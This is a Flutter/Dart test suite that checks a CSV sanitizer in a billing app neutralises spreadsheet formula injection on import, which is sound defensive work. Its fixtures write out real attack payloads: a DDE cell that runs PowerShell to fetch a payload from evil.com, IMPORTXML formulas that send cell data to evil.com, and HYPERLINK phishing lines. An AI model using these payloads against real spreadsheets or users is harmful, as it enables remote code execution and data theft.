import 'dart:convert';
import 'dart:typed_data';

import 'package:flutter_test/flutter_test.dart';
import 'package:billing_templates/models/import_config.dart';
import 'package:billing_templates/models/import_result.dart';
import 'package:billing_templates/services/sheets_importer_service.dart';
import 'package:billing_templates/utils/csv_sanitizer.dart';

/// Comprehensive CSV Injection Security Test Suite
///
/// Tests OWASP-compliant sanitization of CSV formula injection attack vectors.
///
/// Attack Vectors Tested:
/// - Equals sign formulas (=SUM, =cmd, etc.)
/// - Plus sign formulas (+1+1)
/// - Minus sign formulas (-1+1)
/// - At-sign formulas (@SUM)
/// - Pipe character injection (|calc)
/// - Tab character injection
/// - Carriage return injection
///
/// References:
/// - https://owasp.org/www-community/attacks/CSV_Injection
/// - https://cwe.mitre.org/data/definitions/1236.html
void main() {
  group('CsvSanitizer Unit Tests', () {
    group('Formula Detection Tests', () {
      test('detects equals sign formula injection', () {
        expect(CsvSanitizer.requiresSanitization('=SUM(A1:A10)'), true);
        expect(CsvSanitizer.requiresSanitization('=1+1'), true);
        expect(CsvSanitizer.requiresSanitization('=cmd|"/c calc"!A1'), true);
      });

      test('detects plus sign formula injection', () {
        expect(CsvSanitizer.requiresSanitization('+1+1'), true);
        expect(CsvSanitizer.requiresSanitization('+cmd|calc'), true);
      });

      test('detects minus sign formula injection', () {
        expect(CsvSanitizer.requiresSanitization('-1+1'), true);
        expect(CsvSanitizer.requiresSanitization('-SUM(A1)'), true);
      });

      test('detects at-sign formula injection', () {
        expect(CsvSanitizer.requiresSanitization('@SUM(A1:A10)'), true);
        expect(CsvSanitizer.requiresSanitization('@SUM(1+1)'), true);
      });

      test('detects pipe character injection', () {
        expect(CsvSanitizer.requiresSanitization('|calc'), true);
        expect(CsvSanitizer.requiresSanitization('|/bin/sh'), true);
      });

      test('detects tab character injection', () {
        expect(CsvSanitizer.requiresSanitization('\tmalicious'), true);
      });

      test('detects carriage return injection', () {
        expect(CsvSanitizer.requiresSanitization('\rmalicious'), true);
      });

      test('does not flag safe strings', () {
        expect(CsvSanitizer.requiresSanitization('Normal text'), false);
        expect(CsvSanitizer.requiresSanitization('Product Name'), false);
        expect(CsvSanitizer.requiresSanitization('123.45'), false);
        expect(CsvSanitizer.requiresSanitization(''), false);
      });

      test('handles legitimate uses of special characters', () {
        // Email with + should be safe (+ not at start)
        expect(CsvSanitizer.requiresSanitization('user+tag@example.com'), false);

        // Phone number with - should be safe (- not at start)
        expect(CsvSanitizer.requiresSanitization('123-456-7890'), false);

        // Email with @ should be safe (@ not at start)
        expect(CsvSanitizer.requiresSanitization('user@example.com'), false);

        // Price with decimal should be safe
        expect(CsvSanitizer.requiresSanitization('99.99'), false);
      });
    });

    group('Sanitization Correctness Tests', () {
      test('prepends single quote to equals sign formulas', () {
        expect(CsvSanitizer.sanitizeCell('=1+1'), equals("'=1+1"));
        expect(CsvSanitizer.sanitizeCell('=SUM(A1:A10)'), equals("'=SUM(A1:A10)"));
      });

      test('prepends single quote to plus sign formulas', () {
        expect(CsvSanitizer.sanitizeCell('+1+1'), equals("'+1+1"));
      });

      test('prepends single quote to minus sign formulas', () {
        expect(CsvSanitizer.sanitizeCell('-1+1'), equals("'-1+1"));
      });

      test('prepends single quote to at-sign formulas', () {
        expect(CsvSanitizer.sanitizeCell('@SUM(A1)'), equals("'@SUM(A1)"));
      });

      test('prepends single quote to pipe injection', () {
        expect(CsvSanitizer.sanitizeCell('|calc'), equals("'|calc"));
      });

      test('prepends single quote to tab injection', () {
        expect(CsvSanitizer.sanitizeCell('\tmalicious'), equals("'\tmalicious"));
      });

      test('prepends single quote to carriage return injection', () {
        expect(CsvSanitizer.sanitizeCell('\rmalicious'), equals("'\rmalicious"));
      });

      test('preserves whitespace after sanitization', () {
        // Whitespace is always preserved in the output, but we check
        // the trimmed value to detect dangerous formulas
        expect(CsvSanitizer.sanitizeCell('  =1+1'), equals("'  =1+1"));
        expect(CsvSanitizer.sanitizeCell('\t=dangerous'), equals("'\t=dangerous"));
      });

      test('does not modify safe strings', () {
        expect(CsvSanitizer.sanitizeCell('Normal text'), equals('Normal text'));
        expect(CsvSanitizer.sanitizeCell('Product 123'), equals('Product 123'));
        expect(CsvSanitizer.sanitizeCell('user@example.com'), equals('user@example.com'));
      });

      test('handles empty and null values', () {
        expect(CsvSanitizer.sanitizeCell(''), equals(''));
        expect(CsvSanitizer.sanitizeCell(null), equals(''));
      });
    });

    group('Batch Sanitization Tests', () {
      test('sanitizes multiple cells correctly', () {
        final row = ['=SUM(A1)', 'Normal', '+dangerous', 'Safe'];
        final sanitized = CsvSanitizer.sanitizeCells(row);

        expect(sanitized, equals(["'=SUM(A1)", 'Normal', "'+dangerous", 'Safe']));
      });

      test('sanitizes row map correctly', () {
        final row = {
          'name': '=malicious',
          'price': '100',
          'desc': 'Normal',
          'code': '@SUM(1)',
        };

        final sanitized = CsvSanitizer.sanitizeRow(row);

        expect(sanitized['name'], equals("'=malicious"));
        expect(sanitized['price'], equals('100'));
        expect(sanitized['desc'], equals('Normal'));
        expect(sanitized['code'], equals("'@SUM(1)"));
      });
    });

    group('Sanitization Statistics Tests', () {
      test('calculates statistics correctly', () {
        final values = ['=bad', 'good', '', '=bad2', null, 'safe'];
        final stats = CsvSanitizer.getSanitizationStats(values);

        expect(stats['total'], equals(6));
        expect(stats['sanitized'], equals(2)); // =bad, =bad2
        expect(stats['safe'], equals(2)); // good, safe
        expect(stats['empty'], equals(2)); // '', null
      });

      test('handles all dangerous values', () {
        final values = ['=1', '+2', '-3', '@4', '|5'];
        final stats = CsvSanitizer.getSanitizationStats(values);

        expect(stats['total'], equals(5));
        expect(stats['sanitized'], equals(5));
        expect(stats['safe'], equals(0));
        expect(stats['empty'], equals(0));
      });

      test('handles all safe values', () {
        final values = ['safe1', 'safe2', 'safe3'];
        final stats = CsvSanitizer.getSanitizationStats(values);

        expect(stats['total'], equals(3));
        expect(stats['sanitized'], equals(0));
        expect(stats['safe'], equals(3));
        expect(stats['empty'], equals(0));
      });
    });

    group('Edge Cases', () {
      test('handles strings with only dangerous characters', () {
        expect(CsvSanitizer.sanitizeCell('='), equals("'="));
        expect(CsvSanitizer.sanitizeCell('+'), equals("'+"));
        expect(CsvSanitizer.sanitizeCell('-'), equals("'-"));
      });

      test('handles multi-line formulas', () {
        expect(CsvSanitizer.sanitizeCell('=1+1\n+2'), equals("'=1+1\n+2"));
      });

      test('handles Unicode characters', () {
        expect(CsvSanitizer.sanitizeCell('안녕하세요'), equals('안녕하세요'));
        expect(CsvSanitizer.sanitizeCell('=安全'), equals("'=安全"));
      });
    });
  });

  group('Item Import Integration Tests', () {
    late SheetsImporterService service;

    setUp(() {
      service = SheetsImporterService();
    });

    test('sanitizes malicious item name during import', () async {
      final csv = '''
Item Name,Price,HSN Code
=1+1+cmd|'/c calc'!A1,100,12345
Normal Item,200,67890
+malicious,300,11111
''';

      final result = await service.importItems(
        fileBytes: Uint8List.fromList(utf8.encode(csv)),
        fileName: 'malicious.csv',
      );

      expect(result.isSuccess, true);
      expect(result.data!.length, equals(3));

      // Check sanitized values
      expect(result.data![0].name, equals("'=1+1+cmd|'/c calc'!A1"));
      expect(result.data![1].name, equals('Normal Item'));
      expect(result.data![2].name, equals("'+malicious"));

      // Check warnings
      expect(result.warnings.length, greaterThan(0));
      expect(
        result.warnings.any((w) =>
          w.type == ImportWarningType.sanitizedFormulaInjection),
        true,
      );
    });

    test('sanitizes item descriptions', () async {
      final csv = '''
Item Name,Description,Price
Product 1,=HYPERLINK("http://evil.com";"Click me"),100
Product 2,Normal description,200
''';

      final result = await service.importItems(
        fileBytes: Uint8List.fromList(utf8.encode(csv)),
        fileName: 'test.csv',
      );

      expect(result.isSuccess, true);
      expect(result.data![0].description,
          equals("'=HYPERLINK(\"http://evil.com\";\"Click me\")"));
      expect(result.data![1].description, equals('Normal description'));
    });

    test('sanitizes HSN codes with formulas', () async {
      final csv = '''
Item Name,HSN Code,Price
Product 1,@SUM(1+1),100
Product 2,12345,200
''';

      final result = await service.importItems(
        fileBytes: Uint8List.fromList(utf8.encode(csv)),
        fileName: 'test.csv',
      );

      expect(result.isSuccess, true);
      expect(result.data![0].hsnCode, equals("'@SUM(1+1)"));
      expect(result.data![1].hsnCode, equals('12345'));
    });

    test('allows disabling sanitization via config', () async {
      final csv = '''
Item Name,Price
=1+1,100
''';

      final result = await service.importItems(
        fileBytes: Uint8List.fromList(utf8.encode(csv)),
        fileName: 'test.csv',
        config: const ImportConfig(sanitizeInput: false),
      );

      expect(result.isSuccess, true);
      expect(result.data![0].name, equals('=1+1')); // NOT sanitized
      expect(
        result.warnings.any((w) =>
          w.type == ImportWarningType.sanitizedFormulaInjection),
        false,
      );
    });

    test('handles multiple dangerous fields in one row', () async {
      final csv = '''
Item Name,HSN Code,Description,Quantity Unit
=cmd,+calc,-evil,@dangerous
''';

      final result = await service.importItems(
        fileBytes: Uint8List.fromList(utf8.encode(csv)),
        fileName: 'test.csv',
      );

      expect(result.isSuccess, true);
      expect(result.data![0].name, equals("'=cmd"));
      expect(result.data![0].hsnCode, equals("'+calc"));
      expect(result.data![0].description, equals("'-evil"));
      expect(result.data![0].qtyUnit, equals("'@dangerous"));

      // Should have 4 warnings (one per field)
      final sanitizationWarnings = result.warnings
          .where((w) => w.type == ImportWarningType.sanitizedFormulaInjection)
          .toList();
      expect(sanitizationWarnings.length, equals(4));
    });
  });

  group('Party Import Integration Tests', () {
    late SheetsImporterService service;

    setUp(() {
      service = SheetsImporterService();
    });

    test('sanitizes malicious business name during import', () async {
      final csv = '''
Business Name,Phone,Email
=HYPERLINK("http://evil.com";"Fake Corp"),1234567890,test@test.com
Normal Corp,9876543210,normal@corp.com
''';

      final result = await service.importParties(
        fileBytes: Uint8List.fromList(utf8.encode(csv)),
        fileName: 'malicious.csv',
      );

      expect(result.isSuccess, true);
      expect(result.data!.length, equals(2));

      expect(result.data![0].businessName,
          equals("'=HYPERLINK(\"http://evil.com\";\"Fake Corp\")"));
      expect(result.data![1].businessName, equals('Normal Corp'));

      expect(
        result.warnings.any((w) =>
          w.type == ImportWarningType.sanitizedFormulaInjection),
        true,
      );
    });

    test('sanitizes address fields', () async {
      final csv = '''
Business Name,Address
ABC Corp,=1+1+IMPORTXML(CONCAT("http://evil.com/";A1);"//*")
XYZ Corp,123 Normal Street
''';

      final result = await service.importParties(
        fileBytes: Uint8List.fromList(utf8.encode(csv)),
        fileName: 'test.csv',
      );

      expect(result.isSuccess, true);
      expect(result.data![0].businessAddress,
          startsWith("'=1+1+IMPORTXML"));
      expect(result.data![1].businessAddress, equals('123 Normal Street'));
    });

    test('handles legitimate data with special characters', () async {
      final csv = '''
Business Name,Email,Phone
ABC Corp,user+tag@example.com,123-456-7890
XYZ Corp,info@company.co.in,+91-9876543210
''';

      final result = await service.importParties(
        fileBytes: Uint8List.fromList(utf8.encode(csv)),
        fileName: 'test.csv',
      );

      expect(result.isSuccess, true);

      // Email and phone with special chars NOT at start are safe
      expect(result.data![0].email, equals('user+tag@example.com'));
      expect(result.data![0].phone, equals('123-456-7890'));

      // Phone starting with + WILL be sanitized (+ at start is dangerous)
      // This is correct behavior - international format phones should be
      // stored without the + prefix or use a different field for country code
      expect(result.data![1].phone, equals("'+91-9876543210"));

      // Only the phone starting with + should be sanitized
      final sanitizationWarnings = result.warnings
          .where((w) => w.type == ImportWarningType.sanitizedFormulaInjection)
          .toList();
      expect(sanitizationWarnings.length, equals(1));
    });
  });

  group('Performance Tests', () {
    test('sanitization has negligible performance impact', () {
      final stopwatch = Stopwatch()..start();

      for (int i = 0; i < 100000; i++) {
        CsvSanitizer.sanitizeCell('Normal text $i');
      }

      stopwatch.stop();

      // Should complete 100k sanitizations in under 500ms
      expect(stopwatch.elapsedMilliseconds, lessThan(500));
    });

    test('sanitization of dangerous values is fast', () {
      final stopwatch = Stopwatch()..start();

      for (int i = 0; i < 100000; i++) {
        CsvSanitizer.sanitizeCell('=SUM(A$i)');
      }

      stopwatch.stop();

      // Should complete 100k sanitizations in under 500ms
      expect(stopwatch.elapsedMilliseconds, lessThan(500));
    });
  });

  group('Real-World Attack Scenarios', () {
    late SheetsImporterService service;

    setUp(() {
      service = SheetsImporterService();
    });

    test('prevents command execution via Excel DDE', () async {
      final csv = '''
Item Name,Price
=cmd|'/c powershell IEX(wget http://evil.com/payload)'!A1,100
''';

      final result = await service.importItems(
        fileBytes: Uint8List.fromList(utf8.encode(csv)),
        fileName: 'dde_attack.csv',
      );

      expect(result.isSuccess, true);
      expect(result.data![0].name,
          startsWith("'=cmd"));
    });

    test('prevents data exfiltration via IMPORTXML', () async {
      final csv = '''
Business Name,Phone
=IMPORTXML(CONCAT("http://evil.com/?data=";A2);"//root"),1234567890
''';

      final result = await service.importParties(
        fileBytes: Uint8List.fromList(utf8.encode(csv)),
        fileName: 'exfiltration.csv',
      );

      expect(result.isSuccess, true);
      expect(result.data![0].businessName, startsWith("'=IMPORTXML"));
    });

    test('prevents phishing via HYPERLINK', () async {
      final csv = '''
Item Name,Description
Product,=HYPERLINK("http://phishing-site.com";"Click for discount!")
''';

      final result = await service.importItems(
        fileBytes: Uint8List.fromList(utf8.encode(csv)),
        fileName: 'phishing.csv',
      );

      expect(result.isSuccess, true);
      expect(result.data![0].description, startsWith("'=HYPERLINK"));
    });
  });
}
